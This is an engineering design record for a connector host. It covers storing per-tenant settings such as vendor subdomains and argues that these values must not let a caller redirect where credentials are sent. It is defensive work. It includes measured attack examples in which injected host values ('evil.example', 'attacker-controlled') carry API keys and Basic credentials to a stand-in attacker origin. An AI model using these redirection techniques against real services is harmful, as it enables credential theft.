---
story: X-47
status: accepted
---

# Connection settings: a home for the value that is not a secret

Where a tenant puts the `{subdomain}` in `https://{subdomain}.zendesk.com`, why that place is *not*
the credential store, and why supplying it does not become a way for a caller to name a host.

Extends [`connections.md`](connections.md), which made a credential address a function of the
resolved principal and the connector's own declaration, and deferred exactly this: *"a vendor
subdomain is exactly the per-instance fact with no home until two instances can be told apart"*.

## What X-12 exposed

X-12 made this host execute, and the first thing that fell out was a count. **Seventeen of the
fifty-three shipped connectors cannot be invoked at all** — bitbucket, cloudflare, confluence,
contentful, docusign, freshdesk, jira, mailchimp, newrelic, okta, salesforce, shopify, statuspage,
supabase, twilio, vercel, zendesk — because each declares a per-connection value its operations
substitute into a request, and there was nowhere for a tenant to put one. `execution::invoker` bound
`MemoryConfig::new()`, so every one of them refused by name.

The refusal was correct. It failed closed, and it named the field, the service and the tenant. But a
correct refusal is still a connector that does not work, and the shipped surface ran thirty-six of
fifty-three.

The story's own note says thirteen. The measured number is seventeen, and the difference is the
whole of § *The surface is read off the connector, not off its base URL* below. **Thirteen of the
seventeen are made configurable here; four are refused on purpose (§4), so this ships 49 of 53.**

*Re-measured against catalogue 0.10 by X-70: fifty-four connectors, nineteen declaring a
per-connection value, three refused — **51 of 54**. §4 § *The third correction* is why the refused
set shrank.*

## §1 The value lives in a second store, and that is the decision

**Decision: connection settings are kept in their own file, behind their own port, with their own
two bounds. The credential store is not touched.**

The Acceptance asks for this to be argued rather than assumed, so here is the argument, in the order
the costs bite.

**A subdomain is not a secret.** It is in the URL of every request the connector makes, in every
audit record of one, and in the vendor's own dashboard. Storing it at `0600` beside an API token
claims a protection it does not need — and weakens the claim about the token, because a store whose
contents are "mostly not secret" is one nobody treats as a secret store.

**`held` would come to mean two things.** `GET /api/connections` reports, per declared credential,
whether this tenant holds a value at its address. A subdomain written into the credential store is a
value at an address. A connection carrying a subdomain and **no token** would report as held; and
`DELETE`, whose reason to exist is revoking a leaked secret, would report a subdomain among the
credentials it destroyed. That is `connections.md`'s central vocabulary quietly meaning two things.

**The tenant occupancy bound would come to mean two things.** `MAX_TENANT_STORE_BYTES` exists
because `connector_secrets::FileStore` rewrites and `fsync`s one file under one mutex, so one
tenant's size is every other tenant's *credential* write latency. Settings spent against that
allowance would let an operator fill it with subdomains and be told to *"disconnect a connector you
no longer use"* — advice about the wrong store. So this store carries `MAX_SETTING_VALUE_BYTES`
(1 KiB, four times the longest hostname DNS admits) and `MAX_TENANT_SETTINGS_BYTES` (16 KiB), and
the two allowances are never summed.

**Upstream already drew this line.** `connector-pack` has two ports, not one, and says why: a value
arriving through `ConfigStore` *"carries no redaction guarantee"*, which is precisely why a secret
may not travel through it. Storing settings as credentials here would be this repository disagreeing
with the crate it hands both to.

What the two stores **do** share is where they may sit. `exchange_host::paths` is one walk, asked by
both before either is created, because *"is this path somewhere a commit could pick it up"* is one
question — and a tenant's list of vendor accounts committed to a repository is a real leak even
though it is not a credential one. The two functions moved out of `credentials.rs` verbatim.

## §2 The address is derived, and no route accepts a tenant

Keyed exactly as `connector-pack`'s own port is, which this host does not get to change:

```text
(tenant, connector, service, kind, name)
 ^^^^^^  ^^^^^^^^^  ^^^^^^^  ^^^^^^^^^^^
 |       |          |        the `binds` target — `endpoint.subdomain`
 |       |          the operation's own service, `default` for a single-surface connector
 |       a catalogue key
 `Principal::tenant(), from the guard
```

The surface:

| Route | Method | Who | What the caller supplies |
| --- | --- | --- | --- |
| `/api/connections/{connector}/settings` | `GET` | any principal | a connector id |
| `/api/connections/{connector}/settings/{service}/{field}` | `PUT`, `DELETE` | a `User` only | a connector id, a service, a `binds` target, and on `PUT` a value |

The two differ in kind, not only in verb, and §4 § *Who may supply a value* is the argument. Reading
what a connection needs is any principal's business — the answer carries `binds` targets and a `set`
boolean and no values, and an agent that can see *"this connection is missing `endpoint.subdomain`"*
is one that can say so to the human who can supply it. Writing a value into it is a human's.

`{service}` and `{field}` are keys into what the connector's operations declare, exactly as
`{connector}` is a key into the catalogue — refused when nothing declares them, and never a segment
of anything. `connections::tests::no_route_here_accepts_an_address` guards the parameter list and
was widened by these two names with the same behavioural payment X-39 made for `{credential}`:
`a_hostile_service_or_field_cannot_reach_the_settings_address`.

**The service is a required path segment and does not default to `default`.** `contentful` declares
`endpoint.space_id` under both `delivery` and `management`, and a value silently filed under the
wrong one is a management write into a space nobody named — upstream's C-197, which is a measured
incident rather than a hypothetical.

**Values go in and do not come back out.** `GET` answers with `binds` targets and a `set` boolean.
That is stricter than the "not a secret" argument requires, and it is the direction that cannot be
wrong: a `username` field holds an account name or an email address, which is a customer's personal
data whatever the field is called. Adding a read later is additive; removing one is not.

## §3 The surface is read off the connector, not off its base URL

`declared_settings` answers *what does this connector need configured* through
`connector_pack::Rehearsal`, which parses the operation's own emitted Flux — the same derivation the
pack makes when it projects an operation for real.

Scanning `base_url` for `{placeholders}` is the obvious cheaper version and it is **wrong**, by
measurement:

| connector | `base_url` | what its operations actually need |
| --- | --- | --- |
| zendesk | `https://{subdomain}.zendesk.com` | `endpoint.subdomain` |
| bitbucket | `https://api.bitbucket.org/2.0` | `endpoint.workspace` |
| cloudflare | `https://api.cloudflare.com/client/v4` | `endpoint.zone_id` |
| contentful | `https://api.contentful.com` | `endpoint.space_id` and `endpoint.environment_id`, **twice** — once per service |
| statuspage | `https://api.statuspage.io/v1/pages/{page_id}` | `endpoint.page_id` |
| vercel | `https://api.vercel.com` | `endpoint.teamId` |
| docusign | `https://{account_host}/restapi/…/{account_id}` | `endpoint.account_host` **and** `endpoint.account_id` |

A base-URL scan finds twelve of the seventeen and misses five: `bitbucket`, `cloudflare`,
`contentful` and `vercel`, whose endpoint variables sit elsewhere in the operation's Flux, and
`twilio`, which needs only a Basic user half that no URL scan could find at all. A host enumerating
the surface that way would tell an operator they had supplied everything and then refuse the call.

The second kind is the non-secret user half of a `basic` credential — `Field::Username`. Four
connectors need one (zendesk, jira, confluence, twilio), and **zendesk needs both kinds**: without
the user half it refuses before it ever reaches the subdomain. A story that shipped only
`endpoint.*` would have left its own headline connector uninvocable — and would have missed `twilio`
entirely, which needs a username and nothing else.

## §4 Supplying configuration does not become a way to name a host

**This section is a correction, three times over.** The first cut of X-47 argued that
`connector-pack` already prevents this, and shipped a hole. The rework closed that one and left a
second, on the connectors it had just finished calling safe. X-70 is the third, and unlike the other
two it corrects the rule for being *too closed* rather than too open. All three arguments are
recorded here with their flaws, because the flaws are the interesting part and the first two are the
same flaw one level apart:

> a character allow-list constrains what a value **looks like**, not where the request goes —
> and **a suffix pin constrains which vendor a request reaches, not whose account at that vendor.**
>
> — and, from the third: **a value out of a set the catalogue closed is not a value the caller
> chose.**

### What the first cut argued, and why it was vacuous

The attack shape was identified correctly:

```text
subdomain = "acme.zendesk.com@evil.example"
  -> https://acme.zendesk.com@evil.example.zendesk.com/api/v2/tickets/1.json
     authority: evil.example.zendesk.com
```

and the defence was correctly located: `connector-pack` holds the composed authority to an
allow-list of host characters, so `@`, `:`, `/` and `%` cannot appear and no admissible value can
delimit. That defence is real, and against **zendesk** it does what it claims: the template pins
`.zendesk.com`, so every authority any admissible value composes is inside the vendor's domain.

~~That makes the property complete for zendesk.~~ **It does not, and § *The second correction* below
is why.** What the character check buys is that the composed authority is exactly the string the
template produced — which is a claim about the *vendor*, not about the *account*.

The flaw is that a character allow-list constrains **what a value looks like** and says nothing
about **where the request goes**. Those two coincide only when the template pins a suffix. Where the
variable *is* the authority they come apart entirely, and `evil.example` is a perfectly ordinary
hostname that the character check admits without complaint.

Measured on the shipped catalogue, before the fix:

```text
newrelic endpoint.host="evil.example"  stored_ok=true  outcome=OK
  urls=["https://evil.example/v2/applications.json"]  X-Api-Key on the wire
```

The writer needed no special standing: the settings route is `Access::Principal`, which
`require_principal` admits for any kind, and an agent token resolves to `PrincipalKind::Agent`. That
is `AGENTS.md`'s *"an agent's token grants access to an operation, never to a credential"*, broken
through a configuration field — and it was **new reachability**, because before the diff
`execution::invoker` bound `MemoryConfig::new()` and both connectors refused before dispatch.

### The rule, and where it is decided

**Decision: a tenant may supply an endpoint variable only if every host template carrying it pins a
literal vendor suffix. Where the variable is the whole authority, no value is accepted and the
connector stays uninvocable.**

The distinction is published and needs no new dependency: `connector_catalog::Operation::hosts`
carries each operation's host templates with their templating intact. (`connector-pack`'s own `Slot`
would also answer it and is `pub(crate)`, so the catalogue is what carries this.)

`exchange_host::host_pinning` returns one of four answers — three as of X-47, and
`ChosenFrom` since X-70 (§ *The third correction*):

| answer | example | may a value be supplied |
| --- | --- | --- |
| `OutsideTheAuthority` | `bitbucket` `workspace` — in no host template | yes, by a `User` |
| `PinnedTo(".zendesk.com")` | `zendesk` `hosts: ["{subdomain}.zendesk.com"]` | yes, by a `User` |
| `ChosenFrom([…])` | `intercom` `{host}`, three declared region hostnames | yes, by a `User`, and **only one of the declared values** |
| `WholeAuthority("{domain}")` | `okta` `hosts: ["{domain}"]` | **no, by nobody** |

The *kind* column is a second rule and is decided somewhere else — see § *Who may supply a value*.
`host_pinning` answers only whether there is an address here at all; it says nothing about who may
reach it, and deliberately does not, because it is `&'static` catalogue data with no principal in
scope.

"Pins" means: the text after the last placeholder is a literal beginning with `.` and carrying at
least two further labels. Two rather than one because `.com` pins nothing anybody cannot register
under. The honest name for what is wanted is a public-suffix list, which this crate may not take as
a dependency; the approximation is stated rather than hidden and it errs closed.

The rule is about the **declaration**, never about the value as it looks. A rule that inspected
values would be a blocklist of hosts, and a blocklist only catches what somebody enumerated — the
same argument `tests/no_second_request_path.rs` makes for its dependency allow-list.
`acme.okta.com` is refused exactly as `evil.example` is. (§ *The third correction* adds one place
where a *declared* set of values decides, and says why that is not the same thing.)

### What it costs: four connectors, named

| connector | template | consequence |
| --- | --- | --- |
| `newrelic` | `{host}` | uninvocable — `newrelic.api_key` would travel |
| `okta` | `{domain}` | uninvocable — `okta.api_token` would travel |
| `docusign` | `{account_host}` | uninvocable — `docusign.access_token` would travel |
| `freshdesk` | `{domain}` | uninvocable — declares no credential, but this host would still be an open proxy |

**The review that found this named two of them.** The measurement finds four: `freshdesk` and `okta`
are the same defect and were not in the report. That is the argument for deciding this from the
catalogue rather than from a list — a list would have shipped two more holes, and the test that
pins the set (`no_shipped_connector_lets_a_tenant_supply_its_whole_authority`) fails if a fifth
arrives.

So the shipped surface is **49 of 53**, not 53 of 53, and the four are refused with their own
template quoted. `GET .../settings` reports `configurable: false` and a per-field `reason`, so a
connector refused on purpose does not read as a broken one. A smaller working surface beats a larger
one that leaks.

*Re-measured against catalogue 0.10 by X-70: **51 of 54**. `newrelic` left this table — see
§ *The third correction* — `intercom` arrived and left again in the same bump, and the three that
remain are `okta`, `docusign` and `freshdesk`.*

### Where it is enforced

Twice, deliberately.

- `ConnectionSettings::set` refuses, so nothing arriving through this host's surface is stored.
- `ConfigStore::get` refuses again on the way out, so the property belongs to the **port** rather
  than to one write path — an edited file, a backup taken before this rule existed, or a value
  written by an older build all bypass `set` and none of them bypass this.

Both points ask `HostPinning::admits(value)` since X-70, which is the same question with the value
in hand: for three of the four answers the value is irrelevant and this is the old check unchanged,
and for `ChosenFrom` it is membership of the declared set. The `get` side matters more for the
fourth answer than for the third, not less — a planted `api.eu.intercom.io.evil.example` is a
plausible-looking string in a file, and the port is what refuses it.

The value is not deleted when `get` refuses it: **refuse; never repair.** A store that silently
rewrote a file it found suspicious would destroy the evidence of how the value got there.

An operator who genuinely needs one of these four binds their own `ConfigStore` in a composition
they control. That is a decision made once at startup by somebody who can read this section — not
one a request can make.

**The `get` side is now held by a test.** Deleting that second branch used to leave the whole gate
green — 331 passed, 0 failed — because every other test on this axis drives `set`, so all of them
were satisfied by the first enforcement point alone. `a_planted_whole_authority_value_is_refused_on_the_way_out`
reaches the file the way the three scenarios above reach it: the value is **written straight into
the store file**, `set` is never called, and what is then measured is that the port answers `None`,
that `newrelic-application-list` dispatches nothing, that the credential stays off the wire, and
that the file is byte-identical afterwards. Falsified rather than reported: with the branch deleted
it fails by dispatching to `https://evil.example` with the tenant's `X-Api-Key` on the request.

### The second correction: a suffix pin is not a safety argument

The paragraph above says the composed authority is *"always inside the vendor's own domain"*. That
is **true, and it is not a safety argument.** `*.zendesk.com`, `*.atlassian.net`, `*.myshopify.com`,
`*.supabase.co` and `*.my.salesforce.com` are **self-service registrable namespaces**: anybody can
have one in the time it takes to fill in a signup form. "Inside the vendor" and "not the caller's"
are two different claims, and the rule above only ever established the first.

Measured end to end on the seven suffix-pinned connectors — the ones this design had just finished
calling safe:

```text
stored endpoint.subdomain = "attacker-controlled"
url:     "https://attacker-controlled.zendesk.com/api/v2/tickets/1.json"
headers: {"Authorization":"Basic …"}  →  ops@acme.test/token:quiggle-marrow-plimth-42
```

The sentence worth keeping out of all of this is the one at the top of §4: **a suffix pin constrains
which vendor a request reaches, not whose account at that vendor.**

What a suffix pin *does* buy is still real and is why the `WholeAuthority` rule stays: it bounds the
blast radius to one vendor's namespace, so the value cannot become an arbitrary origin, and it keeps
the four unpinned connectors — where there is no bound at all — refused for everyone. It is a bound,
not a boundary.

### The third correction: a closed set the catalogue publishes is not the caller choosing (X-70)

The two corrections above are about the rule being too **open**. This one is about it being too
**closed**, and it is the same reasoning applied to a fact the rule was not reading.

X-67 moved to catalogue 0.10 and the guard turned red, naming a fifth connector:

```text
left:  [docusign/…, freshdesk/…, intercom/endpoint.host ({host}), newrelic/…, okta/…]
right: [docusign/…, freshdesk/…, newrelic/…, okta/…]
```

Upstream C-225 changed intercom's `base_url` to `https://{host}`, and a bare placeholder **is** the
whole authority — so the refusal was **correct under the rule and wrong about intercom**. The same
upstream change shipped `config_choices`, and intercom's `{host}` is a closed set of three vendor
hostnames: `api.intercom.io`, `api.eu.intercom.io`, `api.au.intercom.io`. A tenant picking one of
those is choosing a region from a dropdown. There is no value in the set that reaches
`evil.example`, because the value is not free.

**Decision: `host_pinning` gains a fourth answer, `ChosenFrom([…])`, wherever
`connector_catalog::Provider::choices_for` publishes a non-empty set for the field — and a value is
admitted only if it is *exactly* one of the declared values.**

Why this is not the value rule §4 refuses to write, stated so a later reader does not have to
reconstruct it: **the admitted set is a second piece of declared catalogue data, published by the
same source the host templates this rule already reads come from.** Admitting a value because the
catalogue declares it as one of a closed set is still deciding from the catalogue — the property
X-47 exists to keep, and the reason the guard found four connectors where a hand-written list found
two. Admitting a value because it *looks* fine is what must stay refused, and still is. Nothing in
this repository enumerates a hostname.

The comparison is **byte equality against the published strings**. Not a prefix, not a suffix, not
case-insensitive, nothing trimmed:

| offered | verdict |
| --- | --- |
| `api.eu.intercom.io` | admitted — the catalogue declares it |
| `api.eu.intercom.io.evil.example` | refused — a host somebody else registered, which merely contains one |
| `evil.example.api.eu.intercom.io` | refused — the same, the other way round |
| `API.EU.INTERCOM.IO` | refused — resolves the same and is not what was published; a comparison that normalises is one somebody has to get right |
| `⎵api.eu.intercom.io` | refused — trimming is a repair, and this design refuses rather than repairs |

Two properties keep this from widening by accident, and both are measured rather than reviewed:

- **A choice set that is empty or absent changes nothing.** The template decides, and an unpinned
  one is still `WholeAuthority` — `okta`, `docusign` and `freshdesk` publish no choices and are
  refused exactly as before.
- **The admitted set is censused.** `no_shipped_connector_lets_a_tenant_supply_its_whole_authority`
  now pins *both* lists, with the declared values written out, so an upstream bump that adds a
  connector or a value to the closed set is a failing test rather than a quiet widening — the same
  mechanism that made this story exist.

**The census moved two connectors, not one.** `newrelic` publishes its own closed set — two region
hosts, `api.newrelic.com` and `api.eu.newrelic.com` — and a rule read off the catalogue admits it
for exactly the reason it admits intercom. That was not predicted when this story was written and it
is recorded here rather than smoothed over: a rule that had been special-cased to intercom would
have left newrelic uninvocable for no reason anybody could state.

`newrelic` is therefore no longer the worked example of § *The rule, and where it is decided* — okta
is. The exfiltration measurement that section quotes stands as history; the connector it was
measured on has since had its values closed by the vendor.

**What this does not change:** who may write one. A `ChosenFrom` field is still `User`-only, because
the kind gate is the whole write surface and deliberately not a per-field rule (§ *Who may supply a
value*). And it does not touch § *What this does not close* — a `User` of the tenant can still point
a connection at a region the credential's owner did not intend, which is a smaller exposure than the
one that section already records and is not a new one.

### Who may supply a value, and why that is the fix rather than a value rule

**Decision: `PUT` and `DELETE` on `/api/connections/{connector}/settings/{service}/{field}` are
`Access::PrincipalOfKind(&[PrincipalKind::User])`. The `GET` collection stays open to every kind.**

The route was `Access::Principal`, which `require_principal` admits for *any* kind, and an agent
token resolves to `PrincipalKind::Agent`. So an agent holding nothing but an operation grant could
name the origin its tenant's credential is delivered to — `AGENTS.md` § Invariants, verbatim: *"An
agent's token grants access to an operation, never to a credential."* `Access::PrincipalOfKind` is
the mechanism `/api/agents` already uses; nothing new was invented for this.

**The gate is the whole write surface, not only the fields whose `host_pinning` is `PinnedTo`.** The
narrower rule was available and is not taken:

- `PrincipalKind` **already publishes this division of labour**, and this reads it rather than
  inventing one. `User` is documented as the kind that *"manages connections, credentials and
  grants"*; `Agent` as the kind for which *"humans sign in to wire things up"* while *"agents are
  what call operations all day"*. Supplying a connector's per-connection value is wiring up.
- A per-field rule would make a **stated invariant depend on an approximation**. `host_pinning`'s
  notion of "pins a suffix" is `suffix_of`'s two-label threshold, which this design already records
  as a stand-in for a public-suffix list. That is the right basis for *may a tenant supply this at
  all*, where it errs closed and costs four connectors. It is the wrong basis for *is this the
  invariant's boundary*: one template read as unpinned that is not, and the gate has a hole.
- **The gate has to be enumerable.** `Access` is declared as data precisely so the whole surface can
  be walked — `the_kind_gated_surface_is_only_what_was_declared` compares it against a list with an
  argument beside every entry. A rule that could only be applied inside the handler, once the field
  is known, is the *"a route is guarded by its handler remembering to ask"* that `Access` exists to
  refuse.

**The cost, stated rather than discovered:** an agent also cannot supply bitbucket's `workspace` or
contentful's `space_id`, and those are `OutsideTheAuthority` — they land in a path or a query and
move no request anywhere. That is a bound nobody asked for, and it is accepted because nothing
shipped configures a connection from an agent (§7: there is no client for these routes at all), and
because widening it later is one kind added to a list with an argument beside it while narrowing it
after something depends on it is not.

This is deliberately **not** a rule about values. `attacker-controlled` is refused by no value check
and could not be: a rule that inspected values would be a blocklist of subdomains, and a blocklist
catches only what somebody enumerated — the same argument this design already makes one level up.

### What this does not close

**A `User` of the tenant who did not supply the credential can still read it out this way.** They
write `endpoint.subdomain`, invoke the operation, and the credential arrives at an origin they
control inside the vendor's namespace. Credential values are **write-only** on this surface by
design — §2 — and this path makes one readable to anybody who can name an origin.

The kind gate does not touch this and is not pretended to. Within-tenant it is a smaller boundary
than the agent one, but it is a real one: the model says a stored credential is not readable, and
this is a way to read it.

Closing it needs somewhere an **operator** can pin an allowed host per tenant — the same surface §7
already says the four refused connectors need, with the same authorization question attached, and it
does not exist. Until it does, this is an accepted exposure and it is written down here rather than
inferred from the absence of a test.

## §5 A missing value is still refused by name

This story adds a way to *supply* a value. It does not weaken the refusal, and the refusal is not
this host's to weaken — it is `connector_pack::Error::MissingConfig`, arriving through
`InvokeRefusal::Refused` unchanged.

What did change is that the refusal is now **actionable**. The message names `endpoint.subdomain`;
until now there was nowhere to put one. `POST /api/operations/{operation}/invoke` therefore answers a
`refused` with a `supply_at` field naming the settings route for that operation's connector. It is
derived from the catalogue and not parsed out of upstream's prose — for the same reason the design
already gives for not splitting an `address` field out of the message — so it points at the
connector's settings *collection*, which lists every field and which of them this tenant has
supplied.

## §6 Where this sits relative to X-14 — before it, and not in its way

**This lands first, and it costs X-14 one line.**

X-14 gives the *credential* address an `@instances/<uuid>` level, so a tenant can hold a sandbox
Zendesk beside a production one. This story gives a connection the values it needs to resolve at all.
They are independent today and compose later.

The reasoning for the order:

- The settings key is **upstream's**, not this repository's: `ConfigStore::get` takes
  `(tenant, provider, service, field)` and has no instance parameter. Doing X-14 first would have
  meant designing an instance-aware settings key against a port that cannot express one — a shape
  upstream would have to move before this host could.
- Doing this first costs X-14 exactly what `address_of_declared` already costs it: one more
  component in `SettingsStore::at`, which is the single place a settings address is composed, and
  nothing else. Both stories then insert the same level at their own one seam.
- The `409` in `already_connected` — the X-14 placeholder that refuses a second connection to one
  connector — is untouched, and is still the thing that keeps this coherent meanwhile.

## §7 What this does not do

- **No console.** The surface is HTTP only; rendering "connect your Zendesk" needs the labels and
  help text of upstream's C-87, which the catalogue does not publish.
- **No read-back of values.** §2 argues why, and says which direction the omission errs in.
- **No per-instance settings.** §6.
- **Three connectors this host will not let a tenant configure at all** — `okta`, `docusign`,
  `freshdesk`. It was four; `newrelic` left the list when the catalogue closed its host to two
  published regions (§4 § *The third correction*). Not an oversight and not a gap to close later by
  relaxing §4: closing it needs a place for an *operator* to pin an allowed host per tenant, which
  is a new surface with its own authorization question and belongs in its own story. Until then they
  refuse, and the refusal says which connector, which template and why.
- **No validation of what a value means.** This host refuses a value at an address the connector
  never declared, and one past a bound. Whether `acme` is a real Zendesk subdomain is a question only
  Zendesk can answer, and it answers it with a `404` that reaches the caller whole.
- **No protection from a `User` of the tenant who did not supply the credential.** §4 § *What this
  does not close* states it in full: a suffix-pinned setting plus an invocation reads a write-only
  credential out to an origin inside the vendor's namespace, and the kind gate does not touch it.
  The same operator-scoped surface the four refused connectors need is the thing that would.
- **No authorization model.** The kind gate on the write route asks *what kind of principal is
  this*, which this host answers from the credential it issued. *What may this principal do with
  this connection* is the grant model, and it is still X-13's.
- **The store is single-process**, like `ConnectionGuard`: the read-decide-write around the tenant
  allowance is claimed within this process and not across a cluster. The same limit `connections.md`
  already records, in the same words.
